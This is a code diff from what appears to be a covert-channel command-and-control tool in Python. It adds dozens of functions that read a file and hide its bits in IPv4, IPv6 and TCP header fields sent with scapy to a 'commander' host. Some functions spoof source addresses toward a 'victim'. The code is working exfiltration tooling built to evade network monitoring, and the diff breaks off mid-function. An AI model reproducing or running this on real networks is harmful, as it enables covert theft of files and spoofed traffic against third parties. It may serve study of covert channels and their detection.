@@ -1,11 +1,12 @@
-import binascii
 import getopt
 import ipaddress
 import os
 import queue
 import socket
 import sys
+import time
 from scapy.layers.inet6 import IPv6
+from scapy.sendrecv import send
 import constants
 import importlib
 import inotify.adapters
@@ -328,6 +329,9 @@ def get_packet_count(client_socket: socket):
     print(constants.CLIENT_RESPONSE.format(constants.CLIENT_TOTAL_PACKET_COUNT_MSG.format(count)))
     return count
 
+
+def __bytes_to_bin(data):
+    return ''.join(format(byte, constants.BINARY_MODE) for byte in data)
 
 # ===================== IPV4 EXTRACT COVERT DATA FUNCTIONS =====================
 
@@ -1263,7 +1267,7 @@ def extract_data_icmp_seq_num(packet):
         return binary_data
 
 
-def get_protocol_header_function_map():
+def get_protocol_header_function_extract_map():
     return {  # A tuple of [Header, Field] => Function
         # a) IPv4 Handlers
         ("IPv4", "Version"): extract_data_ipv4_version,
@@ -1316,3 +1320,2263 @@ def get_protocol_header_function_map():
         ("ICMP", "Identifier"): extract_data_icmp_identification,
         ("ICMP", "Sequence Number"): extract_data_icmp_seq_num,
     }
+
+
+# ================== COVERT FILE TRANSFER TO CMDR FUNCTIONS ==================
+
+
+def transfer_file_ipv4_ttl(client_sock: socket.socket, dest_ip: str, file_path: str):
+    """
+    Hides file data covertly in IPv4 headers using the
+    TTL field.
+
+    @note Bit length
+        The TTL field for IPv4 headers is 8 bits
+
+    @param client_sock:
+        A socket representing the client socket
+
+    @param dest_ip:
+        A string representing the destination IP
+
+    @param file_path:
+        A string representing the path of the file
+
+    @return: None
+    """
+    # a) Read the content of the file
+    with open(file_path, constants.READ_BINARY_MODE) as file:
+        file_content = file.read()
+
+    # b) Convert file content to binary
+    binary_data = __bytes_to_bin(file_content)
+
+    # c) Split the binary data into chunks that fit within the TTL range (0-255)
+    ttl_chunk_size = 8  # MAX SIZE is 8 bits == (1 char)
+    chunks = [binary_data[i:i + ttl_chunk_size] for i in range(0, len(binary_data), ttl_chunk_size)]
+
+    # d) Send total number of packets to the client
+    total_packets = str(len(chunks))
+    client_sock.send(total_packets.encode())
+
+    # e) Introduce delay to allow scapy to synchronize between send/sniff calls
+    time.sleep(1)
+
+    # f) Craft packets for each chunk and embed them with a corresponding TTL value
+    for i, chunk in enumerate(chunks):
+        # Convert the chunk to integer (0-255)
+        chunk_value = int(chunk, 2)
+
+        # Craft an IPv4 packet with the chunk value as TTL
+        packet = IP(dst=dest_ip, ttl=chunk_value)
+
+        # Send the packet
+        send(packet, verbose=0)
+
+
+def transfer_file_ipv4_version(client_sock: socket.socket, dest_ip: str, file_path: str):
+    """
+    Hides file data covertly in IPv4 headers using the
+    version field.
+
+    @note Bit length
+        The version field for IPv4 headers is 4 bits
+
+    @param client_sock:
+        A socket representing the client socket
+
+    @param dest_ip:
+        A string representing the destination IP
+
+    @param file_path:
+        A string representing the path of the file
+
+    @return: None
+    """
+    # a) Read the content of the file
+    with open(file_path, constants.READ_BINARY_MODE) as file:
+        file_content = file.read()
+
+    # b) Convert file content to binary
+    binary_data = __bytes_to_bin(file_content)
+
+    # c) Put data in a packet
+    packets = []
+    for i in range(0, len(binary_data), 4):
+        binary_segment = binary_data[i:i + 4].ljust(4, '0')
+        version = int(binary_segment, 2)
+        packet = IP(dst=dest_ip, version=version)
+        packets.append(packet)
+
+    # d) Send total number of packets to the client
+    total_packets = str(len(packets))
+    client_sock.send(total_packets.encode())
+
+    # e) Introduce delay to allow scapy to synchronize between send/sniff calls
+    time.sleep(1)
+
+    # f) Send packets
+    for packet in packets:
+        send(packet, verbose=0)
+
+
+def transfer_file_ipv4_ihl(client_sock: socket.socket, dest_ip: str, file_path: str):
+    """
+    Hides file data covertly in IPv4 headers using the
+    IHL (Internet Header Length) field.
+
+    @attention: // MAY CAUSE ISSUES DURING TRANSMISSION //
+        Changing the IHL field of the IP header may cause
+        packets to be dropped; thus may not be a viable solution
+        for covert data hiding
+
+    @note Bit length
+        The IHL field for IPv4 headers is 4 bits
+
+    @param client_sock:
+        A socket representing the client socket
+
+    @param dest_ip:
+        A string representing the destination IP
+
+    @param file_path:
+        A string representing the path of the file
+
+    @return: None
+    """
+    # a) Read the content of the file
+    with open(file_path, constants.READ_BINARY_MODE) as file:
+        file_content = file.read()
+
+    # b) Convert file content to binary
+    binary_data = __bytes_to_bin(file_content)
+
+    # c) Put data in packet
+    packets = []
+    for i in range(0, len(binary_data), 4):
+        binary_segment = binary_data[i:i + 4].ljust(4, '0')
+        ihl = int(binary_segment, 2)
+        packet = IP(dst=dest_ip, ihl=ihl)
+        packets.append(packet)
+
+    # d) Send total number of packets to the client
+    total_packets = str(len(packets))
+    client_sock.send(total_packets.encode())
+
+    # e) Introduce delay to allow scapy to synchronize between send/sniff calls
+    time.sleep(1)
+
+    # f) Send packets
+    for packet in packets:
+        send(packet, verbose=0)
+
+
+def transfer_file_ipv4_ds(client_sock: socket.socket, dest_ip: str, file_path: str):
+    """
+    Hides file data covertly in IPv4 headers using the
+    DS (differentiated services) field.
+
+    @note Bit length
+        The DS field for IPv4 headers is 6 bits
+
+    @param client_sock:
+        A socket representing the client socket
+
+    @param dest_ip:
+        A string representing the destination IP
+
+    @param file_path:
+        A string representing the path of the file
+
+    @return: None
+    """
+    # a) Read the content of the file
+    with open(file_path, constants.READ_BINARY_MODE) as file:
+        file_content = file.read()
+
+    # b) Convert file content to binary
+    binary_data = __bytes_to_bin(file_content)
+
+    # c) Put data in packet
+    packets = []
+    for i in range(0, len(binary_data), 6):
+        binary_segment = binary_data[i:i + 6].ljust(6, '0')
+        ds = int(binary_segment, 2)
+        packet = IP(dst=dest_ip, tos=(ds << 2))
+        packets.append(packet)
+
+    # d) Send total number of packets to the client
+    total_packets = str(len(packets))
+    client_sock.send(total_packets.encode())
+
+    # e) Introduce delay to allow scapy to synchronize between send/sniff calls
+    time.sleep(1)
+
+    # f) Send packets
+    for packet in packets:
+        send(packet, verbose=0)
+
+
+def transfer_file_ipv4_ecn(client_sock: socket.socket, dest_ip: str, file_path: str):
+    """
+    Hides file data covertly in IPv4 headers using the
+    ECN field.
+
+    @note Bit length
+        The ECN field for IPv4 headers is 2 bits
+
+    @param client_sock:
+        A socket representing the client socket
+
+    @param dest_ip:
+        A string representing the destination IP
+
+    @param file_path:
+        A string representing the path of the file
+
+    @return: None
+    """
+    # a) Read the content of the file
+    with open(file_path, constants.READ_BINARY_MODE) as file:
+        file_content = file.read()
+
+    # b) Convert file content to binary
+    binary_data = __bytes_to_bin(file_content)
+
+    # c) Put data in packet
+    packets = []
+    for i in range(0, len(binary_data), 2):
+        binary_segment = binary_data[i:i + 2].ljust(2, '0')
+        ecn = int(binary_segment, 2)
+        packet = IP(dst=dest_ip)
+        packet.tos = (packet.tos & 0b11111100) | ecn  # Set first 2 bits (ECN) of ToS field
+        packets.append(packet)
+
+    # d) Send total number of packets to the client
+    total_packets = str(len(packets))
+    client_sock.send(total_packets.encode())
+
+    # e) Introduce delay to allow scapy to synchronize between send/sniff calls
+    time.sleep(1)
+
+    # f) Send packets
+    for packet in packets:
+        send(packet, verbose=0)
+
+
+def transfer_file_ipv4_total_length(client_sock: socket.socket, dest_ip: str, file_path: str):
+    """
+    Hides file data covertly in IPv4 headers using the
+    total length field.
+
+    @note Bit length
+        The total length field for IPv4 headers is 16 bits
+
+    @param client_sock:
+        A socket representing the client socket
+
+    @param dest_ip:
+        A string representing the destination IP
+
+    @param file_path:
+        A string representing the path of the file
+
+    @return: None
+    """
+    # a) Read the content of the file
+    with open(file_path, constants.READ_BINARY_MODE) as file:
+        file_content = file.read()
+
+    # b) Convert file content to binary
+    binary_data = __bytes_to_bin(file_content)
+
+    # c) Put data in packet
+    packets = []
+    for i in range(0, len(binary_data), 16):
+        binary_segment = binary_data[i:i + 16].ljust(16, '0')
+        total_length = int(binary_segment, 2)
+        packet = IP(dst=dest_ip)
+        packet.len = total_length
+        packets.append(packet)
+
+    # d) Send total number of packets to the client
+    total_packets = str(len(packets))
+    client_sock.send(total_packets.encode())
+
+    # e) Introduce delay to allow scapy to synchronize between send/sniff calls
+    time.sleep(1)
+
+    # f) Send packets
+    for packet in packets:
+        send(packet, verbose=0)
+
+
+def transfer_file_ipv4_identification(client_sock: socket.socket, dest_ip: str, file_path: str):
+    """
+    Hides file data covertly in IPv4 headers using the
+    identification field.
+
+    @note Bit length
+        The identification field for IPv4 headers is 16 bits
+
+    @param client_sock:
+        A socket representing the client socket
+
+    @param dest_ip:
+        A string representing the destination IP
+
+    @param file_path:
+        A string representing the path of the file
+
+    @return: None
+    """
+    # a) Read the content of the file
+    with open(file_path, constants.READ_BINARY_MODE) as file:
+        file_content = file.read()
+
+    # b) Convert file content to binary
+    binary_data = __bytes_to_bin(file_content)
+
+    # c) Put data in packet
+    packets = []
+    for i in range(0, len(binary_data), 16):
+        binary_segment = binary_data[i:i + 16].ljust(16, '0')
+        identification = int(binary_segment, 2)
+        packet = IP(dst=dest_ip, id=identification)
+        packets.append(packet)
+
+    # d) Send total number of packets to the client
+    total_packets = str(len(packets))
+    client_sock.send(total_packets.encode())
+
+    # e) Introduce delay to allow scapy to synchronize between send/sniff calls
+    time.sleep(1)
+
+    # f) Send packets
+    for packet in packets:
+        send(packet, verbose=0)
+
+
+def transfer_file_ipv4_flags(client_sock: socket.socket, dest_ip: str, file_path: str):
+    """
+    Hides file data covertly in IPv4 headers using the
+    flags field.
+
+    @note Bit length
+        The flags field for IPv4 headers is 3 bits
+
+    @param client_sock:
+        A socket representing the client socket
+
+    @param dest_ip:
+        A string representing the destination IP
+
+    @param file_path:
+        A string representing the path of the file
+
+    @return: None
+    """
+    # a) Read the content of the file
+    with open(file_path, constants.READ_BINARY_MODE) as file:
+        file_content = file.read()
+
+    # b) Convert file content to binary
+    binary_data = __bytes_to_bin(file_content)
+
+    # c) Put data in packet
+    packets = []
+    for i in range(0, len(binary_data), 3):  # 3 bit chunks
+        binary_segment = binary_data[i:i + 3].ljust(3, '0')
+        flag = int(binary_segment, 2)
+        packet = IP(dst=dest_ip, flags=flag)
+        packets.append(packet)
+
+    # d) Send total number of packets to the client
+    total_packets = str(len(packets))
+    client_sock.send(total_packets.encode())
+
+    # e) Introduce delay to allow scapy to synchronize between send/sniff calls
+    time.sleep(1)
+
+    # f) Send packets
+    for packet in packets:
+        send(packet, verbose=0)
+
+
+def transfer_file_ipv4_frag_offset(client_sock: socket.socket, dest_ip: str, file_path: str):
+    """
+    Hides file data covertly in IPv4 headers using the
+    fragment offset field.
+
+    @note Bit length
+        The fragment offset field for IPv4 headers is 13 bits
+
+    @param client_sock:
+        A socket representing the client socket
+
+    @param dest_ip:
+        A string representing the destination IP
+
+    @param file_path:
+        A string representing the path of the file
+
+    @return: None
+    """
+    # a) Read the content of the file
+    with open(file_path, constants.READ_BINARY_MODE) as file:
+        file_content = file.read()
+
+    # b) Convert file content to binary
+    binary_data = __bytes_to_bin(file_content)
+
+    # c) Put data in packet
+    packets = []
+    for i in range(0, len(binary_data), 13):
+        binary_segment = binary_data[i:i + 13].ljust(13, '0')
+        fragment_offset = int(binary_segment, 2)
+        packet = IP(dst=dest_ip, frag=fragment_offset)
+        packets.append(packet)
+
+    # d) Send total number of packets to the client
+    total_packets = str(len(packets))
+    client_sock.send(total_packets.encode())
+
+    # e) Introduce delay to allow scapy to synchronize between send/sniff calls
+    time.sleep(1)
+
+    # f) Send packets
+    for packet in packets:
+        send(packet, verbose=0)
+
+
+def transfer_file_ipv4_protocol(client_sock: socket.socket, dest_ip: str, file_path: str):
+    """
+    Hides file data covertly in IPv4 headers using the
+    protocol field.
+
+    @note Bit length
+        The protocol field for IPv4 headers is 8 bits
+
+    @param client_sock:
+        A socket representing the client socket
+
+    @param dest_ip:
+        A string representing the destination IP
+
+    @param file_path:
+        A string representing the path of the file
+
+    @return: None
+    """
+    # a) Read the content of the file
+    with open(file_path, constants.READ_BINARY_MODE) as file:
+        file_content = file.read()
+
+    # b) Convert file content to binary
+    binary_data = __bytes_to_bin(file_content)
+
+    # c) Put data in packet
+    packets = []
+    for i in range(0, len(binary_data), 8):
+        binary_segment = binary_data[i:i + 8].ljust(8, '0')
+        protocol = int(binary_segment, 2)
+        packet = IP(dst=dest_ip, proto=protocol)
+        packets.append(packet)
+
+    # d) Send total number of packets to the client
+    total_packets = str(len(packets))
+    client_sock.send(total_packets.encode())
+
+    # e) Introduce delay to allow scapy to synchronize between send/sniff calls
+    time.sleep(1)
+
+    # f) Send packets
+    for packet in packets:
+        send(packet, verbose=0)
+
+
+def transfer_file_ipv4_header_chksum(client_sock: socket.socket, dest_ip: str, file_path: str):
+    """
+    Hides file data covertly in IPv4 headers using the
+    header checksum field.
+
+    @note Bit length
+        The header checksum field for IPv4 headers is 16 bits (2 bytes)
+
+    @param client_sock:
+        A socket representing the client socket
+
+    @param dest_ip:
+        A string representing the destination IP
+
+    @param file_path:
+        A string representing the path of the file
+
+    @return: None
+    """
+    # a) Read the content of the file
+    with open(file_path, constants.READ_BINARY_MODE) as file:
+        file_content = file.read()
+
+    # b) Convert file content to binary
+    binary_data = __bytes_to_bin(file_content)
+
+    # c) Put data in packet
+    packets = []
+    for i in range(0, len(binary_data), 16):
+        binary_segment = binary_data[i:i + 16].ljust(16, '0')
+        checksum = int(binary_segment, 2)
+        packet = IP(dst=dest_ip, chksum=checksum)
+        packets.append(packet)
+
+    # d) Send total number of packets to the client
+    total_packets = str(len(packets))
+    client_sock.send(total_packets.encode())
+
+    # e) Introduce delay to allow scapy to synchronize between send/sniff calls
+    time.sleep(1)
+
+    # f) Send packets
+    for packet in packets:
+        send(packet, verbose=0)
+
+
+def transfer_file_ipv4_src_addr(client_sock: socket.socket, client_ip: str,
+                                client_port: int, src_port: int, file_path: str):
+    """
+    Hides file data covertly in IPv4 headers using the
+    source address field; uses TCP.
+
+    @attention: // *** THIS IS SOURCE IP SPOOFING *** //
+                Please use this wisely and with permission!!!
+
+                This will send covert data under (SYN packets) to the victim; however -
+                due to the TCP protocol, this forces the victim to send a
+                SYN/ACK packet response to the spoofed addresses.
+
+    @note Bit length
+        The source address field for IPv4 headers is 32 bits (4 bytes)
+
+    @param client_sock:
+        A socket representing the client socket
+
+    @param client_ip:
+        A string representing the client IP
+
+    @param client_port:
+        An integer representing the client port
+
+    @param src_port:
+        An integer representing the source port
+
+    @param file_path:
+        A string representing the path of the file
+
+    @return: None
+    """
+    # a) Read the content of the file
+    with open(file_path, constants.READ_BINARY_MODE) as file:
+        file_content = file.read()
+
+    # b) Convert file content to binary
+    binary_data = __bytes_to_bin(file_content)
+
+    # c) Put data in packet
+    packets = []
+    for i in range(0, len(binary_data), 32):
+        binary_segment = binary_data[i:i + 32].ljust(32, '0')
+        src_ip = '.'.join(str(int(binary_segment[j:j + 8], 2)) for j in range(0, 32, 8))
+        packet = IP(src=src_ip, dst=client_ip) / TCP(sport=src_port, dport=client_port)
+        packets.append(packet)
+
+    # d) Send total number of packets to the client
+    total_packets = str(len(packets))
+    client_sock.send(total_packets.encode())
+
+    # e) Introduce delay to allow scapy to synchronize between send/sniff calls
+    time.sleep(1)
+
+    # f) Send packets
+    for packet in packets:
+        send(packet, verbose=0)
+
+
+def transfer_file_ipv4_dst_addr(client_sock: socket.socket, dest_ip: str, file_path: str):
+    """
+    Hides file data covertly in IPv4 headers using the
+    destination address field.
+
+    @attention: // *** THIS IS DESTINATION IP SPOOFING *** //
+                Changing the destination IP field of the IP header will
+                cause the packets created to be sent out to random IP
+                addresses.
+
+                The target victim will not be able to receive any
+                crafted packets; hence - any covert data.
+
+    @note Bit length
+        The destination address field for IPv4 headers is 32 bits (4 bytes)
+
+    @param client_sock:
+        A socket representing the client socket
+
+    @param dest_ip:
+        A string representing the destination IP
+
+    @param file_path:
+        A string representing the path of the file
+
+    @return: None
+    """
+    # a) Read the content of the file
+    with open(file_path, constants.READ_BINARY_MODE) as file:
+        file_content = file.read()
+
+    # b) Convert file content to binary
+    binary_data = __bytes_to_bin(file_content)
+
+    # c) Put data in packet
+    packets = []
+    for i in range(0, len(binary_data), 32):
+        binary_segment = binary_data[i:i + 32].ljust(32, '0')
+        dst_ip = '.'.join(str(int(binary_segment[j:j + 8], 2)) for j in range(0, 32, 8))
+        packet = IP(dst=dst_ip)
+        packets.append(packet)
+
+    # d) Send total number of packets to the client
+    total_packets = str(len(packets))
+    client_sock.send(total_packets.encode())
+
+    # e) Introduce delay to allow scapy to synchronize between send/sniff calls
+    time.sleep(1)
+
+    # f) Send packets
+    for packet in packets:
+        send(packet, verbose=0)
+
+
+def __transfer_file_dst_addr_error_handler(field: str, header: str):
+    print(constants.DESTINATION_ADDRESS_ERROR.format(field, header))
+    print(constants.DESTINATION_ADDRESS_ERROR_REASON)
+    print(constants.MENU_CLOSING_BANNER)
+
+
+# ===================== IPV6 INSERT COVERT DATA FUNCTIONS =====================
+
+def transfer_file_ipv6_version(client_sock: socket.socket,
+                               dest_ip: str,
+                               dest_port: int,
+                               file_path: str):
+    """
+    Hides file data covertly in IPv6 headers using the
+    version field.
+
+    @note Bit length
+        The version field for IPv6 headers is 4 bits
+
+    @param client_sock:
+        A socket representing the client (target) socket
+
+    @param dest_ip:
+        A string representing the destination/target IP
+
+    @param dest_port:
+        A string representing the destination/target port
+
+    @param file_path:
+        A string representing the path of the file
+
+    @return: None
+    """
+    # a) Read the content of the file
+    with open(file_path, constants.READ_BINARY_MODE) as file:
+        file_content = file.read()
+
+    # b) Convert file content to binary
+    binary_data = __bytes_to_bin(file_content)
+
+    # c) Put data in packet
+    packets = []
+    for i in range(0, len(binary_data), 4):
+        binary_segment = binary_data[i:i + 4].ljust(4, '0')
+        version = int(binary_segment, 2)
+        packet = IPv6(dst=dest_ip, version=version) / TCP(dport=dest_port)
+        packets.append(packet)
+
+    # d) Send total number of packets to the client
+    total_packets = str(len(packets))
+    client_sock.send(total_packets.encode())
+
+    # e) Introduce delay to allow scapy to synchronize between send/sniff calls
+    time.sleep(1)
+
+    # f) Send packets
+    for packet in packets:
+        send(packet, verbose=0)
+
+
+def transfer_file_ipv6_traffic_class(client_sock: socket.socket,
+                                     dest_ip: str,
+                                     dest_port: int,
+                                     file_path: str):
+    """
+    Hides file data covertly in IPv6 headers using the
+    traffic class field.
+
+    @note Bit length
+        The traffic class field for IPv6 headers is 8 bits
+
+    @param client_sock:
+        A socket representing the client (target) socket
+
+    @param dest_ip:
+        A string representing the destination/target IP
+
+    @param dest_port:
+        A string representing the destination/target port
+
+    @param file_path:
+        A string representing the path of the file
+
+    @return: None
+    """
+    # a) Read the content of the file
+    with open(file_path, constants.READ_BINARY_MODE) as file:
+        file_content = file.read()
+
+    # b) Convert file content to binary
+    binary_data = __bytes_to_bin(file_content)
+
+    # c) Put data in packet
+    packets = []
+    for i in range(0, len(binary_data), 8):
+        binary_segment = binary_data[i:i + 8].ljust(8, '0')
+        traffic_class = int(binary_segment, 2)
+        packet = IPv6(dst=dest_ip, tc=traffic_class) / TCP(dport=dest_port)
+        packets.append(packet)
+
+    # d) Send total number of packets to the client
+    total_packets = str(len(packets))
+    client_sock.send(total_packets.encode())
+
+    # e) Introduce delay to allow scapy to synchronize between send/sniff calls
+    time.sleep(1)
+
+    # f) Send packets
+    for packet in packets:
+        send(packet, verbose=0)
+
+
+def transfer_file_ipv6_flow_label(client_sock: socket.socket,
+                                  dest_ip: str,
+                                  dest_port: int,
+                                  file_path: str):
+    """
+    Hides file data covertly in IPv6 headers using the
+    flow label field.
+
+    @note Bit length
+        The flow label field for IPv6 headers is 20 bits
+
+    @param client_sock:
+        A socket representing the client (target) socket
+
+    @param dest_ip:
+        A string representing the destination/target IP
+
+    @param dest_port:
+        A string representing the destination/target port
+
+    @param file_path:
+        A string representing the path of the file
+
+    @return: None
+    """
+    # a) Read the content of the file
+    with open(file_path, constants.READ_BINARY_MODE) as file:
+        file_content = file.read()
+
+    # b) Convert file content to binary
+    binary_data = __bytes_to_bin(file_content)
+
+    # c) Put data in packet
+    packets = []
+    for i in range(0, len(binary_data), 20):
+        binary_segment = binary_data[i:i + 20].ljust(20, '0')
+        flow_label = int(binary_segment, 2)
+        packet = IPv6(dst=dest_ip, fl=flow_label) / TCP(dport=dest_port)
+        packets.append(packet)
+
+    # d) Send total number of packets to the client
+    total_packets = str(len(packets))
+    client_sock.send(total_packets.encode())
+
+    # e) Introduce delay to allow scapy to synchronize between send/sniff calls
+    time.sleep(1)
+
+    # f) Send packets
+    for packet in packets:
+        send(packet, verbose=0)
+
+
+def transfer_file_ipv6_payload_length(client_sock: socket.socket,
+                                      dest_ip: str,
+                                      dest_port: int,
+                                      file_path: str):
+    """
+    Hides file data covertly in IPv6 headers using the
+    payload length field.
+
+    @note Bit length
+        The payload length field for IPv6 headers is 16 bits (2 bytes)
+
+    @param client_sock:
+        A socket representing the client (target) socket
+
+    @param dest_ip:
+        A string representing the destination/target IP
+
+    @param dest_port:
+        A string representing the destination/target port
+
+    @param file_path:
+        A string representing the path of the file
+
+    @return: None
+    """
+    # a) Read the content of the file
+    with open(file_path, constants.READ_BINARY_MODE) as file:
+        file_content = file.read()
+
+    # b) Convert file content to binary
+    binary_data = __bytes_to_bin(file_content)
+
+    # c) Put data in packet
+    packets = []
+    for i in range(0, len(binary_data), 16):
+        binary_segment = binary_data[i:i + 16].ljust(16, '0')
+        payload_length = int(binary_segment, 2)
+        packet = IPv6(dst=dest_ip, plen=payload_length) / TCP(dport=dest_port)
+        packets.append(packet)
+
+    # d) Send total number of packets to the client
+    total_packets = str(len(packets))
+    client_sock.send(total_packets.encode())
+
+    # e) Introduce delay to allow scapy to synchronize between send/sniff calls
+    time.sleep(1)
+
+    # f) Send packets
+    for packet in packets:
+        send(packet, verbose=0)
+
+
+def transfer_file_ipv6_next_header(client_sock: socket.socket,
+                                   dest_ip: str,
+                                   dest_port: int,
+                                   file_path: str):
+    """
+    Hides file data covertly in IPv6 headers using the
+    next header field.
+
+    @note Bit length
+        The next header field for IPv6 headers is 8 bits (1 byte)
+
+    @param client_sock:
+        A socket representing the client (target) socket
+
+    @param dest_ip:
+        A string representing the destination/target IP
+
+    @param dest_port:
+        A string representing the destination/target port
+
+    @param file_path:
+        A string representing the path of the file
+
+    @return: None
+    """
+    # a) Read the content of the file
+    with open(file_path, constants.READ_BINARY_MODE) as file:
+        file_content = file.read()
+
+    # b) Convert file content to binary
+    binary_data = __bytes_to_bin(file_content)
+
+    # c) Put data in packet
+    packets = []
+    for i in range(0, len(binary_data), 8):
+        binary_segment = binary_data[i:i + 8].ljust(8, '0')
+        next_header = int(binary_segment, 2)
+        packet = IPv6(dst=dest_ip, nh=next_header) / TCP(dport=dest_port)
+        packets.append(packet)
+
+    # d) Send total number of packets to the client
+    total_packets = str(len(packets))
+    client_sock.send(total_packets.encode())
+
+    # e) Introduce delay to allow scapy to synchronize between send/sniff calls
+    time.sleep(1)
+
+    # f) Send packets
+    for packet in packets:
+        send(packet, verbose=0)
+
+
+def transfer_file_ipv6_hop_limit(client_sock: socket.socket,
+                                 dest_ip: str,
+                                 dest_port: int,
+                                 file_path: str):
+    """
+    Hides file data covertly in IPv6 headers using the
+    hop limit field.
+
+    @note Bit length
+        The hop limit field for IPv6 headers is 8 bits (1 byte)
+
+    @param client_sock:
+        A socket representing the client (target) socket
+
+    @param dest_ip:
+        A string representing the destination/target IP
+
+    @param dest_port:
+        A string representing the destination/target port
+
+    @param file_path:
+        A string representing the path of the file
+
+    @return: None
+    """
+    # a) Read the content of the file
+    with open(file_path, constants.READ_BINARY_MODE) as file:
+        file_content = file.read()
+
+    # b) Convert file content to binary
+    binary_data = __bytes_to_bin(file_content)
+
+    # c) Put data in packet
+    packets = []
+    for i in range(0, len(binary_data), 8):
+        binary_segment = binary_data[i:i + 8].ljust(8, '0')
+        hop_limit = int(binary_segment, 2)
+        packet = IPv6(dst=dest_ip, hlim=hop_limit) / TCP(dport=dest_port)
+        packets.append(packet)
+
+    # d) Send total number of packets to the client
+    total_packets = str(len(packets))
+    client_sock.send(total_packets.encode())
+
+    # e) Introduce delay to allow scapy to synchronize between send/sniff calls
+    time.sleep(1)
+
+    # f) Send packets
+    for packet in packets:
+        send(packet, verbose=0)
+
+
+def transfer_file_ipv6_src_addr(client_sock: socket.socket,
+                                dest_ip: str,
+                                dest_port: int,
+                                file_path: str):
+    """
+    Hides file data covertly in IPv6 headers using the
+    source address field.
+
+    @attention: // *** THIS IS SOURCE IP SPOOFING *** //
+                Please use this wisely and with permission!!!
+
+                This will send covert data under (SYN packets) to the victim; however -
+                due to the TCP protocol used here, this forces the victim to send a
+                SYN/ACK packet response to the spoofed addresses.
+
+    @note Bit length
+        The source address field for IPv6 headers is 128 bits (16 bytes)
+
+    @param client_sock:
+        A socket representing the client (target) socket
+
+    @param dest_ip:
+        A string representing the destination/target IP
+
+    @param dest_port:
+        A string representing the destination/target port
+
+    @param file_path:
+        A string representing the path of the file
+
+    @return: None
+    """
+    # a) Read the content of the file
+    with open(file_path, constants.READ_BINARY_MODE) as file:
+        file_content = file.read()
+
+    # b) Convert file content to binary
+    binary_data = __bytes_to_bin(file_content)
+
+    # c) Put data in packet
+    packets = []
+    for i in range(0, len(binary_data), 32):
+        binary_segment = binary_data[i:i + 32].ljust(32, '0')
+        src_addr = ':'.join([binary_segment[j:j + 4] for j in range(0, 32, 4)])
+        packet = IPv6(dst=dest_ip, src=src_addr) / TCP(dport=dest_port)
+        packets.append(packet)
+
+    # d) Send total number of packets to the client
+    total_packets = str(len(packets))
+    client_sock.send(total_packets.encode())
+
+    # e) Introduce delay to allow scapy to synchronize between send/sniff calls
+    time.sleep(1)
+
+    # f) Send packets
+    for packet in packets:
+        send(packet, verbose=0)
+
+
+def transfer_file_ipv6_dest_addr(client_sock: socket.socket,
+                                 dest_ip: str,
+                                 dest_port: int,
+                                 file_path: str):
+    """
+    Hides file data covertly in IPv6 headers using the
+    source address field.
+
+    @attention: FUNCTIONALITY DISABLED
+                Changing the destination IP field of the IP header will
+                cause the packets created to be sent out to random IP
+                addresses.
+
+                The target victim will not be able to receive any
+                crafted packets; hence - any covert data.
+
+    @note Bit length
+        The source address field for IPv6 headers is 128 bits (16 bytes)
+
+    @param client_sock:
+        A socket representing the client (target) socket
+
+    @param dest_ip:
+        A string representing the destination/target IP
+
+    @param dest_port:
+        A string representing the destination/target port
+
+    @param file_path:
+        A string representing the path of the file
+
+    @return: None
+    """
+    print(constants.IPV6_DESTINATION_FIELD_ERROR)
+
+
+# ===================== TCP INSERT COVERT DATA FUNCTIONS =====================
+
+
+def transfer_file_tcp_src_port(client_sock: socket.socket,
+                               dest_ip: str,
+                               dest_port: int,
+                               src_port: int,
+                               file_path: str):
+    """
+    Hides file data covertly in TCP headers using the
+    source port field.
+
+    @note Bit length
+        The source port field for TCP headers is 16 bits (2 Bytes)
+
+    @param client_sock:
+        A socket representing the client socket
+
+    @param dest_ip:
+        A string representing the destination IP
+
+    @param dest_port:
+        A string representing the destination port
+
+    @param src_port:
+        A string representing the commander's port
+
+    @param file_path:
+        A string representing the path of the file
+
+    @return: None
+    """
+    # a) Read the content of the file
+    with open(file_path, constants.READ_BINARY_MODE) as file:
+        file_content = file.read()
+
+    # b) Convert file content to binary
+    binary_data = __bytes_to_bin(file_content)
+
+    # c) Put data in packet
+    packets = []
+    for i in range(0, len(binary_data), 16):
+        binary_segment = binary_data[i:i + 16].ljust(16, '0')
+        new_src_port = int(binary_segment, 2)
+        packet = IP(dst=dest_ip) / TCP(sport=new_src_port, dport=dest_port)
+        packets.append(packet)
+
+    # d) Send total number of packets to the client
+    total_packets = str(len(packets))
+    client_sock.send(total_packets.encode())
+
+    # e) Introduce delay to allow scapy to synchronize between send/sniff calls
+    time.sleep(1)
+
+    # f) Send packets
+    for packet in packets:
+        send(packet, verbose=0)
+
+
+def transfer_file_tcp_dst_port(client_sock: socket.socket,
+                               dest_ip: str,
+                               dest_port: int,
+                               src_port: int,
+                               file_path: str):
+    """
+    Hides file data covertly in TCP headers using the
+    destination port field.
+
+    @note Bit length
+        The destination port field for TCP headers is 16 bits (2 Bytes)
+
+    @param client_sock:
+        A socket representing the client socket
+
+    @param dest_ip:
+        A string representing the destination IP
+
+    @param dest_port:
+        A string representing the destination port
+
+    @param src_port:
+        A string representing the commander's port
+
+    @param file_path:
+        A string representing the path of the file
+
+    @return: None
+    """
+    # a) Read the content of the file
+    with open(file_path, constants.READ_BINARY_MODE) as file:
+        file_content = file.read()
+
+    # b) Convert file content to binary
+    binary_data = __bytes_to_bin(file_content)
+
+    # c) Put data in packet
+    packets = []
+    for i in range(0, len(binary_data), 16):
+        binary_segment = binary_data[i:i + 16].ljust(16, '0')
+        new_dest_port = int(binary_segment, 2)
+        packet = IP(dst=dest_ip) / TCP(sport=src_port, dport=new_dest_port)
+        packets.append(packet)
+
+    # d) Send total number of packets to the client
+    total_packets = str(len(packets))
+    client_sock.send(total_packets.encode())
+
+    # e) Introduce delay to allow scapy to synchronize between send/sniff calls
+    time.sleep(1)
+
+    # f) Send packets
+    for packet in packets:
+        send(packet, verbose=0)
+
+
+def transfer_file_tcp_seq_num(client_sock: socket.socket,
+                              dest_ip: str,
+                              dest_port: int,
+                              src_port: int,
+                              file_path: str):
+    """
+    Hides file data covertly in TCP headers using the
+    sequence number field.
+
+    @note Bit length
+        The sequence number field for TCP headers is 32 bits (4 Bytes)
+
+    @param client_sock:
+        A socket representing the client socket
+
+    @param dest_ip:
+        A string representing the destination IP
+
+    @param dest_port:
+        A string representing the destination port
+
+    @param src_port:
+        A string representing the commander's port
+
+    @param file_path:
+        A string representing the path of the file
+
+    @return: None
+    """
+    # a) Read the content of the file
+    with open(file_path, constants.READ_BINARY_MODE) as file:
+        file_content = file.read()
+
+    # b) Convert file content to binary
+    binary_data = __bytes_to_bin(file_content)
+
